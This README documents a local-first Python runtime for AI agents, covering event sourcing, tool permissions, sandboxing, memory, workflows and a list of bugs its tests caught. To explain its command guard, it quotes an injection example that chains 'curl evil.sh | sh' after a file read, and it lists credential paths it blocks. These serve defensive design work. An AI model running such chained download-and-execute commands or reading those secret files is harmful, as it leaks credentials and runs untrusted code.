# unified-ai-agent

[![CI](https://github.com/111wukong/unified-ai-agent/actions/workflows/ci.yml/badge.svg)](https://github.com/111wukong/unified-ai-agent/actions/workflows/ci.yml)
[![python](https://img.shields.io/badge/python-3.11%20%7C%203.12%20%7C%203.13-blue)](https://github.com/111wukong/unified-ai-agent)
[![tests](https://img.shields.io/badge/tests-449%20offline-brightgreen)](https://github.com/111wukong/unified-ai-agent)
[![license](https://img.shields.io/badge/license-MIT-green)](LICENSE)

一个本地优先的通用 AI Agent 运行时。Python 3.11+，SQLite，无外部服务依赖。

```bash
uaa init
uaa run --model mock "查看当前目录下的 Python 文件并总结"   # 离线，不需要任何 API key
uaa run "分析认证模块并补充测试"                            # 用真实模型
uaa serve                                                   # HTTP + WebSocket + Web 控制台
uaa desktop                                                 # 原生桌面窗口
uaa desktop --bundle                                        # 打成可双击的 .app
uaa sandbox                                                 # 报告进程隔离实际是否生效
```

---

## 它是什么，不是什么

**是**：一个有状态的 Agent 运行时。任务可中断、可恢复、可审计，工具权限可强制，上下文有预算，技能可沉淀。

**不是**：又一个「把 LangGraph / CrewAI / AutoGen 的优点缝在一起」的框架。那种项目通常的结局是同时继承四家的缺点，还多一层自己的 bug。

### 设计主张

CrewAI 的强项是角色化的人体工学，LangGraph 的强项是有类型的图状态 + checkpoint，AutoGen 的强项是对话式多 Agent 协作。**这三样在第一版里没法同时做好。** 能做的只有一件事：

> 选一个真正可靠的执行内核，然后把其余范式做成内核之上的**薄层**。

这个项目选的内核是**事件溯源的有限状态机**。角色 = 配置预设，图 = 声明式工作流文件，对话 = 多 Agent 层的一种策略 —— 都还没有实现，但都只需要加层，不需要改内核。

而真正的护城河是**三家都没做好**的三件事：

| | LangGraph | CrewAI | AutoGen | 本项目 |
|---|---|---|---|---|
| 崩溃后「在途工具调用」的语义 | 部分 | 无 | 无 | **写前台账 + 幂等性判定** |
| 上下文预算与压缩 | 手动 | 无 | 无 | **主动压缩 + 确定性兜底** |
| 每步都调一次 LLM 做反思 | — | — | 是（token 成本 5–6×） | **只调一次，且只在任务结束时** |
| 技能能否自升级 | — | — | — | **状态机强制人工闸门** |

---

## 快速开始

```bash
python3 -m venv .venv && .venv/bin/pip install -e ".[dev]"
.venv/bin/uaa init
.venv/bin/uaa doctor          # 检查环境、密钥、权限策略
.venv/bin/uaa tools           # 列出工具及其权限等级
.venv/bin/uaa demo            # 离线端到端演示
```

配置模型（任意 OpenAI 兼容端点：OpenAI / DeepSeek / 通义千问 / Ollama / LM Studio / vLLM）：

```bash
export DEEPSEEK_API_KEY=sk-...
.venv/bin/uaa config set default_model deepseek
.venv/bin/uaa run "找出所有 TODO 并分类"
```

---

## 核心概念

### 1. 事件是真相，状态是折叠

`events` 表 append-only，是唯一真相。`tasks.state` 是给 `task list/show` 用的投影，**恢复时由 `replay()` 重新折叠出来**。两者不一致时，投影错。

好处：不可能「恢复到一个从未存在过的状态」。这是事件溯源在 Agent 上最实际的收益。

```bash
uaa task events <task_id>   # 看真相
uaa task show <task_id>     # 看投影
```

### 2. 工具台账是写前的

顺序是：`校验 → 策略判定 → 台账(begin) → 执行 → 台账(end)`。

台账行在工具碰任何东西**之前**落库。进程如果死在 begin 和 end 之间，那行会以 `status='started'` 留下来。恢复时才能区分「确定没跑」和「可能跑了」。

```python
# runtime.py
unfinished = self.store.unfinished_calls(state.task_id)
#   tool.idempotent is True  -> 重跑，把新结果给模型
#   tool.idempotent is False -> 结果未知。告诉模型「必须先核实状态」，
#                               而不是悄悄重跑 `git commit`
```

这是绝大多数 Agent 框架的 `resume` 不成立的原因。

### 3. 上下文有预算，压缩是主动的

规格里只写了「短期记忆」，没写预算 —— 这是「跑了 8 步然后 400 挂掉」的根因。

- 消息列表**每步从状态重建**，不是 append。所以压缩是状态的纯函数，不是对增长列表动手术。
- 压缩由 token 估算**提前触发**，而不是等 provider 报错（等报错时这一轮已经废了）。
- 永远有确定性兜底：没有便宜的模型可用时，压缩降级成结构化摘要，而不是让任务卡死。

### 4. 权限是强制的，不是建议的

六档效果等级：`READ_ONLY / WRITE_LOCAL / EXECUTE_LOCAL / NETWORK / EXTERNAL_SIDE_EFFECT / SYSTEM_ADMIN`。

三件规格里没写、但决定「权限模型」还是「权限表演」的事：

1. **先规范化再判包含。** 未解析的路径上做 `relative_to`，被 `../../` 和一个指向 `~/.ssh` 的符号链接秒穿。
2. **元字符就是第二条命令。** 允许 `cat` 的白名单，在 `cat secrets; curl evil.sh | sh` 面前一文不值。默认拒绝元字符。
3. **子进程环境不继承。** `run_command` 拿到的是**白名单**环境（不是黑名单 —— 猜不到名字的 `DASHSCOPE_KEY_ID` 会漏），所以 `env` / `printenv` 偷不走运行时手里的 API key。

```bash
uaa run "..." --approve execute_local      # 预授权某一档
uaa run "..." --yes                        # 除 system_admin 全放行
```

### 5. 技能优先于 Prompt 堆积

直接采用 [Agent Skills 规范](https://agentskills.io/specification)（`SKILL.md` + YAML frontmatter），不自己发明 `skill.yaml`。收益是具体的：为 Claude Code 写的技能能直接加载，反过来也一样；而 `allowed-tools` 字段正好映射到本项目的权限引擎。

渐进披露：启动时只加载 `name` + `description`（每技能约 100 token），正文由 `load_skill` 工具按需拉取。

技能状态阶梯是**强制**的：

```
candidate → validated → approved → active → deprecated
```

Agent 自己写的技能停在 `candidate`，**无法执行**，直到人工推进。

### 6. 模型无关靠的是能力矩阵，不是一个 Protocol

六行的 `ChatModel` Protocol 藏起了真正会坏的东西：OpenAI 支持严格 JSON Schema，Anthropic 不支持；Ollama 和大多数本地模型根本没有原生 tool calling。

```python
class ModelCapabilities:
    native_tool_calling: bool   # False -> 自动套 TextProtocolModel 降级层
    json_schema: bool           # False -> 规划走 JSON object + 修复环
    max_context_tokens: int     # -> 上下文预算的输入
    prompt_cache: bool          # -> 是否给稳定前缀打 cache 断点
```

一个适配器覆盖 OpenAI / DeepSeek / 通义千问 / Moonshot / OpenRouter / vLLM / LM Studio / Ollama —— 因为它们是同一个线格式。Anthropic 单独原生实现，因为差异是真的。

---

## 架构

```
CLI (typer + rich)
  └── AgentRuntime                     状态机 + 预算硬限 + 中断恢复
        ├── Planner                    结构化输出 + 修复环
        ├── ContextBuilder             预算 / 主动压缩 / 确定性兜底
        ├── ToolRunner                 校验 → 策略 → 写前台账 → 执行 → 截断外置
        ├── Reflector                  任务结束后一次：记忆 + 技能候选
        └── PermissionEngine           路径围栏 / 命令守卫 / 域名白名单 / 环境脱敏
              ├── ToolRegistry         builtin + skills + MCP
              ├── SkillRegistry        SKILL.md 规范 + 安全审查
              ├── ModelRegistry        能力矩阵 + 适配器
              └── Store                SQLite: events / tasks / tool_calls / artifacts / memories(FTS5) / skills
```

### 目录

```
src/unified_agent/
├── types.py            EffectClass / Message / ToolCall / 幂等键
├── config.py           TOML 结构化配置 + env 覆盖
├── errors.py
├── cli.py
├── agent/
│   ├── state.py        AgentState / PlanStep / LogEntry / replay()
│   ├── runtime.py      主循环、预算闸门、恢复语义、HITL
│   ├── context.py      预算与压缩
│   ├── planner.py      结构化规划 + 修复环
│   ├── executor.py     写前台账、截断外置
│   ├── reflector.py    记忆提取 + 技能候选
│   ├── prompts.py
│   └── factory.py      装配
├── tools/
│   ├── base.py         Tool / ToolSpec / 小型 JSON Schema 校验器
│   ├── permissions.py  路径围栏、命令守卫、环境脱敏
│   ├── fs.py           read_file / write_file / apply_patch / list_directory / search_files / file_info
│   ├── git.py          git_status / git_diff / git_log（READ_ONLY，免确认）/ git_commit（必须确认）
│   ├── shell.py        run_command / run_tests / run_linter（自动识别项目 venv）
│   ├── net.py          http_get / http_post（重定向逐跳复检白名单）
│   ├── mcp.py          MCP stdio 客户端（双协议时代）
│   ├── memory_tools.py save_memory / search_memory / load_skill / update_plan / finish
│   └── registry.py
├── orchestration/
│   ├── workflow.py     DSL 解析 + 静态校验（DAG、引用、可达性、审批）
│   ├── expressions.py  `{{#node.field#}}` 解析与条件求值
│   └── runner.py       执行器：工作流运行本身是一个 task
├── memory/
│   ├── embeddings.py   向量提供方：OpenAI 兼容 / 离线哈希 / 无
│   ├── vector.py       cosine 检索，sqlite-vec 加速、纯 Python 兜底
│   └── extract.py      抽取 + 矛盾调和（add/update/duplicate/none）
├── desktop/
│   ├── launcher.py     服务线程 + 系统 webview 窗口 + 健康门
│   ├── bundle.py       .app 打包 + 纯标准库生成图标
│   └── __main__.py     bundle 里的可执行入口
├── api/
│   ├── app.py          FastAPI：REST + AG-UI(SSE) + WebSocket + 控制台挂载
│   ├── agui.py         AG-UI 编码器（内部事件 → 协议事件）
│   └── console/        零构建 Web 控制台（原生 JS/CSS）
├── sandbox/
│   └── base.py         Seatbelt / Docker / None，探测式可用性 + 回退留痕
├── models/
│   ├── base.py         ChatModel / ModelCapabilities / 文本协议降级
│   ├── openai_compat.py
│   ├── anthropic.py
│   ├── mock.py         离线确定性模型（测试与 demo）
│   └── registry.py
├── skills/             SKILL.md 加载、规范校验、安全审查、状态阶梯
├── storage/            SQLite schema、事件存储、工具台账、产物
└── observability/      事件词汇表、JSONL sink、密钥脱敏
```

---

## MCP 的双协议时代

MCP 在 **2026-07-28** 做了一次破坏性改版：删掉 `initialize`/`initialized` 握手和 `Mcp-Session-Id`，协议层变成**无状态**，协议版本/客户端身份/能力改为每请求走 `_meta`，并新增 `server/discover`。官方明确说跨这条线**不保证互通**。

所以客户端必须做时代探测：先试 `server/discover`，失败再退回 `initialize` 握手。

```toml
[[mcp_servers]]
name = "filesystem"
command = "npx"
args = ["-y", "@modelcontextprotocol/server-filesystem", "/tmp"]
effect_class = "execute_local"      # 第三方服务器不能自己声明权限等级
requires_confirmation = true
```

工具名会加上 `mcp__<server>__` 前缀。**第三方 MCP 服务器自称「只读」不构成它只读的证据** —— 效果等级由本地配置决定，且一律假定 `idempotent=False`。

---

## 服务层：AG-UI，不是自造的 WebSocket 格式

```bash
uaa serve                      # 控制台 http://127.0.0.1:8000/
```

前端协议直接实现 **AG-UI**（CopilotKit 与 LangGraph / Mastra / Pydantic AI / Microsoft Agent Framework 共用的开放标准），而不是自己发明一套 WebSocket 消息格式。收益是具体的：控制台可以随时换成 CopilotKit 的 React 组件，后端一行不改。

三类事件模式，覆盖了 Agent 前端的全部需求：

```
RUN_STARTED / STEP_STARTED / STEP_FINISHED / RUN_FINISHED / RUN_ERROR
TEXT_MESSAGE_START / CONTENT / END          ← 逐 token 流式
TOOL_CALL_START / ARGS / END / RESULT
ACTIVITY_SNAPSHOT (activityType="PLAN")     ← 计划直接渲染成卡片
STATE_SNAPSHOT / STATE_DELTA (RFC 6902)
CUSTOM (usage / context_compacted / tool_ambiguous …)
```

**人工确认不是单独的事件**，而是 `RUN_FINISHED` 的 `outcome`：

```json
{ "type": "interrupt", "interrupts": [ { "id": "...", "tool": "run_command", ... } ] }
```

这样前端只有一个终止事件要处理，而不是「等 RUN_FINISHED，但它不来怎么办」。

三个容易写错的地方，本实现明确处理了：

- **deltas 与最终消息不能都发。** 已经流过 token 的消息，durable 事件只负责关闭它；晚连的订阅者才需要整段文本。编码器记录哪些 messageId 流过。
- **SSE 与 WebSocket 共用同一个生成器。** 两份实现正是 WebSocket 那条路漏掉「回放历史」然后永久挂住的原因。
- **`POST /agui` 先订阅再启动任务。** 反过来会和前几个事件竞态，控制台会渲染出空计划。

```bash
curl -N -X POST http://127.0.0.1:8000/agui \
  -H 'Content-Type: application/json' \
  -d '{"messages":[{"role":"user","content":"分析这个项目"}]}'
```

---

## 工作流：加载时就能证明引用不会悬空

```bash
uaa workflow list                       # 有哪些、各自能不能加载
uaa workflow validate triage-and-fix    # 一次报出**所有**问题
uaa workflow show triage-and-fix        # 按执行顺序打印图
uaa workflow run triage-and-fix -i goal="修复失败的测试"
```

节点之间**不共享可变状态**，靠显式引用上游输出：`{{#analyse.answer#}}`。这看起来比共享状态更啰嗦，但它换来一件共享状态给不了的东西：**每个引用都能在跑之前检查**。LangGraph 的共享状态里引用错了是运行时 `KeyError`；这里是带位置的加载期错误。

加载期会检查：节点类型已知、必填字段齐全、引用指向存在的节点和**存在的字段**、引用必须指向上游、没有孤立节点（永远不跑且不吭声）、图无环、分支有兜底。

七种节点，不是四十种（Dify 有 40+ 是因为它是可视化搭建器）：

| 节点 | 做什么 |
|---|---|
| `start` | 声明输入 |
| `agent` | 跑一个完整 agent 任务（**是 task，有 `parent_task_id`**） |
| `tool` | 直接调一个工具，不经过模型 |
| `code` | 跑一段命令 —— **走 shell 工具，不在进程内执行** |
| `ifelse` | 条件分支，`when` / `else` |
| `iteration` | 对列表逐项跑 body 节点，有 `max_items` 上限 |
| `end` | 声明输出 |

**运行器是既有运行时之上的驱动，不是平行系统。** 一次工作流运行**本身就是一个 task**：所以事件流、预算、取消、A2A 的任务映射全都自动适用，一行都不用重写。`uaa task events <id>` 就能看到 `workflow_started → node_started/node_completed × N → workflow_completed`。

**工作流可以声明自己允许的副作用**（`approvals:` 或节点级 `approve:`）—— 这样它能无人值守运行，而且是可评审、可 diff 的。但 `system_admin` **不允许**由工作流授予：和 HTTP 层拒绝它的理由一样，数据文件不是策略权威。

**`code` 节点为什么不在进程内跑**：Dify 的 code 节点在服务进程里执行。工作流文件是**数据**，数据不该能伸手进运行时的内存。走 `run_command` 意味着沙箱和命令守卫照常生效。

---

## 记忆：难的不是检索，是矛盾

```bash
uaa memory stats                              # 存了什么、向量到底可不可用
uaa memory search "部署流程" --mode hybrid     # FTS5 + 向量，RRF 融合
uaa memory reindex                            # 给还没向量的记忆补上
uaa memory history <id>                       # 这条记忆以前是什么
```

调研 Mem0 / Letta / Zep 三家后收敛到同一个结论：**Agent 记忆的难点不是检索，是矛盾**。只会追加的存储会同时返回「项目用 pytest」和「已迁移到 unittest」，然后让模型去猜哪个是当前的。

所以写入路径是两段：

1. **抽取**——任务结束后提炼原子事实（就是反思那一步）。
2. **调和**——把每条候选和它最近的邻居比对，判 `add` / `update` / `duplicate` / `none`。

`update` **不覆盖**：旧行留着、`superseded_by` 指向前方、`memory_revisions` 指向后方。所以 `uaa memory history` 还能回答「这条以前是什么」——这正是 Zep 用「失效」而非「替换」的理由。

**成本控制决定了它能不能用**：只有存在邻居时才调模型。一条真正的新事实是免费的，而那是绝大多数情况。

三层各司其职，不是三选一：

| | 负责 | 什么时候不可用 |
|---|---|---|
| FTS5 trigram | 精确词；**唯一**支持中文两字查询的 | 从不 |
| 向量（cosine） | 语义近邻，sqlite-vec 加速 | 没配 embedding 模型时退化为字符 n-gram 哈希 |
| curator | 抽取 + 矛盾调和 | 没有模型时退化为精确去重 |

**离线回退是诚实的**：字符 n-gram 哈希抓的是**形式**不是**含义** —— 它能聚类近似重复和词形变化，但不会把「测试很慢」和「pytest 要四十秒」联系起来。`uaa memory stats` 会明说 `semantic: no`，而不是让结果看起来像语义检索。

---

## 桌面端：系统 webview，不是 Electron

```bash
pip install -e ".[desktop]"     # 只多一个依赖：pywebview
uaa desktop                      # 原生窗口
uaa desktop --bundle             # ~/Applications/UnifiedAgent.app，可双击
```

> **如果 `pip install` 报 `EEXIST: mkdir .../pip-install-*/...`**，用 `uv` 装：
> `uv pip install --python .venv/bin/python "pywebview>=5.0"`。
> 这是 pip 在某些受限环境下创建临时目录失败，uv 走的是另一套机制。

窗口是**操作系统自己的 webview**（macOS 上 WKWebView）套在**同一个服务、同一个控制台**外面。没有第二套 UI，没有第二套构建系统，没有捆绑 Chromium。

为什么不是 Electron / Tauri：

| | 代价 |
|---|---|
| Electron | 每个应用 ~150MB，并且往一个刻意不带 npm 的仓库里塞进 npm |
| Tauri | 二进制更小，但要在 Python 项目里维护 Rust + Node 工具链，只为开一个窗口 |
| **pywebview** | 一个依赖，三行代码开窗口，复用现有全部前端 |

诚实的代价：默认打出来的是**启动器 bundle**（用构建时的解释器跑已安装的包），不是自包含二进制 —— 移动或删除那个虚拟环境会让应用失效。`--bundle` 的输出里会明说这一点。要自包含就得上 PyInstaller（`--frozen` 会告诉你缺什么，而不是半途失败）。

**应用图标是纯标准库画出来的**：手写 PNG 编码器 + macOS 自带的 `iconutil`。为一个图标引一个绘图库，对一个以「零依赖」为卖点的项目不值。

`.app` 里有什么：`Info.plist`（含 bundle id、版本、图标引用）、可执行启动脚本、`AppIcon.icns`。启动脚本在解释器不见了时会**说清楚并回退**到 PATH 上的 `python3` —— 双击之后毫无反应是最糟的结果。

---

## 进程隔离：macOS 用 Seatbelt，Docker 作为可选后端

```bash
uaa sandbox        # 报告实际生效的是哪个后端，并真的试一次越界写入
```

```bash
uaa sandbox --report    # 报告 + 把机器可读结果写到 <home>/sandbox-verify.json
```

`uaa config set sandbox.mode read-only` 会让**项目目录含 `.git` 全部只读** —— `git log/diff/show/blame` 能用，`commit/checkout/fetch` 和文件编辑全部失败。**「分析这个项目」和「修改这个项目」是两个不同的档位**，不该共用一份权限配置。

> **必须在普通终端里跑。** macOS **拒绝**从「已经被沙箱化的进程」安装更窄的 profile（`sandbox_apply: Operation not permitted`）—— 容器里、以及任何会给子进程套沙箱的环境里都探测不到。`uaa sandbox` 会检测到这种情况，并打印一条**可直接粘贴**的命令。

报告里带**环境指纹**，因为「这台机器上 Seatbelt 不能用」和「这里测不了」导向相反的决定，而单看探测结果分不出来：

```json
{
  "environment": { "inside_parent_sandbox": true, "sandbox_marker_count": 90, ... },
  "probe": { "ok": false, "detail": "sandbox_apply: Operation not permitted" },
  "builtin_profile": { "ok": false, "detail": "..." },
  "verdict": "...this run was itself inside a sandbox, so the probe result says nothing about this machine"
}
```

`builtin_profile` 是**第二个数据点**：`sandbox-exec -n no-network` 用的是 Apple 自带的 profile。它和生成的 profile 以同样方式失败，就说明问题不在生成的 profile 上——这排除了最容易得出的错误结论。

威胁模型是抄 Codex / Gemini CLI 的，而且理由充分：

> **anti-tampering, not anti-exfiltration** —— 读是全开的，锁的是写。

Agent 必须读代码、读配置、读工具链；读也锁死它就废了。而「写」可以精确白名单。

**可用性是探测出来的，不是假定的。** 二进制存在不等于能用：在已经被沙箱化的进程里，macOS **拒绝**安装一个更窄的 profile。所以 `available` 会真的去应用一个限制性 profile 试一次——用 `(allow default)` 探测是无效的，那在任何环境都通过，正好掩盖了要防的失败。

**回退一定留痕。** `wrap()` 在后端不可用时会直通（不能让坏沙箱废掉所有命令），但 `uaa run/chat/serve/doctor` 都会打出告警。静默降级到无隔离，比没有隔离更糟。

诚实的限制，`uaa sandbox` 会全部打出来：网络是放开的（**不是出口防火墙**）；`npm login`/`gh auth login` 在沙箱内会失败（它们要**写**凭据文件）；macOS 的 Keychain 经 Mach IPC 的写入挡不住；`sandbox-exec` 被 Apple 标记为弃用。

---

## 安全边界（明确说明）

- API key **只**从环境变量读，从不写盘。
- 日志与**产物**都过脱敏（外置 200KB 工具输出这件事，如果不过脱敏等于把刚 `cat` 的 key 落盘）。
- `.env`、`~/.ssh/**`、`*.pem`、`~/.aws/**` 等即使在 `READ_ONLY` 也拒绝（`.env.example` 等模板除外）。
- `run_command` 永远 `shell=False`，参数经 `shlex.split` 后作为 argv 执行。
- `http_get`/`http_post` 的重定向**逐跳**复检白名单 —— 一个被允许的主机 302 到 `evil.example` 不会被静默跟随。
- 沙箱：第一版用「路径围栏 + 命令白名单 + 环境脱敏」，**没有** Docker。Docker 每条命令 3 秒起的开销不值得，第二版做成可插拔。

---

## 尚未实现（刻意）

第一版刻意只做「一个 Agent 能可靠完成一个真实开发任务，且开发者清楚它做了什么」。以下按路线图延后：

| 阶段 | 内容 |
|---|---|
| Phase 2 | ✅ FastAPI + SSE/WebSocket（AG-UI）、✅ 沙箱（Seatbelt / Docker） |
| Phase 3 | ✅ 向量记忆与矛盾处理、⏸ 技能审核流程 |
| Phase 4 | ✅ YAML 工作流、⏸ 多 Agent（orchestrator-worker）、⏸ A2A v1.0 |
| Phase 5 | ✅ Web 控制台（零构建）、⏸ TypeScript SDK、渠道适配器 |

调研与采纳决策见 [`docs/phase2-5-research.md`](docs/phase2-5-research.md)。

多 Agent 明确不在第一版：token 消耗增加、调试困难、状态同步复杂、错误责任不清。**AutoGen 的 5–6× token 成本就来自每个 agent 每轮一次 LLM 调用** —— 本项目的反思只在任务结束后调一次，也是同一个理由。

跨框架 Agent 通信**不自造协议**，等 Phase 4 直接实现 A2A（Linux Foundation 标准，150+ 支持者）。

---

## 开发

```bash
.venv/bin/python -m pytest -q                       # 449 条，全部离线，不需要 API key
.venv/bin/python -m pytest tests/test_resume_semantics.py -v
.venv/bin/ruff check src tests
```

测试套件的设计目标：**不需要网络、不需要密钥就能跑真实 agent 循环**。需要 API key 的测试套件等于不会跑的测试套件。

`ScriptedModel` 让整个循环可控可断言：结构化输出（规划）交给确定性 mock，循环回合按脚本走。崩溃用「插入写前台账行」来模拟——这正是真实崩溃留下的东西。

### 测试抓到的静默缺陷

下面这些都不是"功能没写"，是**代码看起来对、行为不对**。列出来是因为它们是这类系统的主要风险：

| 缺陷 | 为什么危险 |
|---|---|
| 恢复后 `steps_used` 归零 | **步数预算可被无限重置**——预算不再是预算 |
| 批准后的工具调用会丢失 | 恢复时重新问模型，模型重新决策，被批准的那个调用**静默消失** |
| `TextProtocolModel` 没实现抽象方法 | 降级路径根本实例化不了；只有本地模型用户会撞上 |
| 搜索 `**/*.py` 漏掉根目录文件 | `fnmatch` 的 `*` 匹配 `/`，所以 `**/*.py` 要求路径里必须有斜杠 |
| macOS 上 `/private/var/folders` 被判为系统目录 | 权限围栏变成误报制造机，temp 目录全不可写 |
| `created_at` 同毫秒并列 | 任务列表顺序不确定 |
| **Rich 把输出里的 `[a-zA-Z]` 当成标记吃掉** | 正则、pytest 的 `[100%]`、TOML 的 `[models.x]` 全部静默变形 |
| `run_tests` 在 venv 项目里找不到 pytest | 环境脱敏顺带把 venv 的 PATH 也清了 |
| JSONL 日志建了 sink 但没接线 | 事件日志永远是空的 |
| **事件总线的 `publish` 被当成 `emit` 调用，异常被吞** | 事件一条都进不了总线，SSE 流永远空转 |
| **AG-UI 编码器返回 dict，调用方按 list 迭代** | `for x in dict` 迭代的是键 —— `RUN_FINISHED` 从未发出，线上只有 `data: "type"` |
| `@dataclass` 默认 `eq=True` 使订阅者不可哈希 | 加进 `set` 直接崩；测试全绿是因为没人订阅 |
| WebSocket 只转发实时事件、不回放历史 | 晚连的客户端永远挂住 |
| 沙箱不可用时 `wrap` 静默直通 | 用户配了 Seatbelt 却在裸跑，没人告诉他 |
| **判定逻辑写反** | `escaped` 非空意味着写入**逃逸了**，却返回「已阻断」—— 报告会给出与事实相反的结论 |
| 可粘贴命令里的路径没加引号 | 项目路径含空格（`WorkBuddy AI`），粘贴即失败 |
| **健康探测不带令牌** | 令牌默认开启，于是 `uaa desktop` 每次都会报「服务起不来」，而服务其实好好的 |
| **`iconutil` 要求目录名以 `.iconset` 结尾** | 起错名一律报 "Invalid Iconset"，而失败原因被吞成「iconutil 不可用」 |
| 打包用 `rmtree` 清理中间产物 | 递归删除撞上删除护栏，打包直接崩；改成暂存目录 + rename 换入 |
| `--check` 却先要求 GUI 可用 | 它存在的意义就是在没有 GUI 的地方验证，结果在 CI 上必然失败 |

## License

MIT
